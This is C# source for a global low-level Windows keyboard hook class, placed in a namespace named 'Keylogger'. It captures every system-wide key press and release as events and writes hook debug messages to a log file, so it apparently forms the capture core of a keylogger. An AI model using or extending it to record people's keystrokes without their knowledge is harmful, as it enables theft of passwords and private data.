using System.Windows.Forms;
using System.Runtime.InteropServices;
using System;
using System.IO;

namespace Keylogger
{
    public class GlobalKeyboardHook
    {
        #region Definition of Structures, Constants and Delegates

        public delegate int KeyboardHookProc(int nCode, int wParam, ref GlobalKeyboardHookStruct lParam);

        public struct GlobalKeyboardHookStruct
        {
            public int vkCode;
            public int scanCode;
            public int flags;
            public int time;
            public int dwExtraInfo;
        }

        const int WM_KEYDOWN = 0x100;
        const int WM_KEYUP = 0x101;
        const int WM_SYSKEYDOWN = 0x104;
        const int WM_SYSKEYUP = 0x105;
        const int WH_KEYBOARD_LL = 13;

        #endregion

        #region Events

        public event KeyEventHandler KeyDown;
        public event KeyEventHandler KeyUp;

        #endregion

        #region Instance Variables

        IntPtr hookHandle = IntPtr.Zero;
        KeyboardHookProc _hookProc;
        string LogFileName;

        #endregion

        #region DLL Imports

        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall, SetLastError = true)]
        static extern IntPtr SetWindowsHookEx(int hookID, KeyboardHookProc callback, IntPtr hInstance, uint threadID);

        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall, SetLastError = true)]
        static extern bool UnhookWindowsHookEx(IntPtr hookHandle);

        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        static extern int CallNextHookEx(IntPtr hookHandle, int nCode, int wParam, ref GlobalKeyboardHookStruct lParam);

        #endregion

        #region Constructors and Destructors

        public GlobalKeyboardHook(string logFileName)
        {
            LogFileName = logFileName;
            hook();            
        }

        ~GlobalKeyboardHook()
        {
            unhook();
        }

        #endregion

        #region Public Methods

        private void hook()
        {
            _hookProc = new KeyboardHookProc(hookProc);
            IntPtr hInstance = LoadLibrary("user32");
            hookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, _hookProc, hInstance, 0);
            File.AppendAllText(LogFileName, "We have entered in hook while building GlobalkeyboardHook... _hookProc = " + _hookProc + "   hInstance = " + hInstance + "     hookHandle = " + hookHandle);
            File.AppendAllText(LogFileName, Environment.NewLine);
        }

        private int hookProc(int nCode, int wParam, ref GlobalKeyboardHookStruct lParam)
        {
            File.AppendAllText(LogFileName, "We have entered in hookProc... nCode = " + nCode + "   wParam = " + wParam + "     lParam = " + lParam);
            File.AppendAllText(LogFileName, Environment.NewLine);
            if (nCode >= 0)
            {
                Keys key = (Keys)lParam.vkCode;
                KeyEventArgs keyEventArgs = new KeyEventArgs(key);

                if ((wParam == WM_KEYUP || wParam == WM_SYSKEYUP) && KeyUp != null)
                {
                    KeyUp(this, keyEventArgs);
                }
                else if ((wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) && KeyDown != null)
                {
                    KeyDown(this, keyEventArgs);
                }
                if (keyEventArgs.Handled) return 1;
            }
            return CallNextHookEx(hookHandle, nCode, wParam, ref lParam);
        }

        private void unhook()
        {
            UnhookWindowsHookEx(hookHandle);
        }

        #endregion
    }
}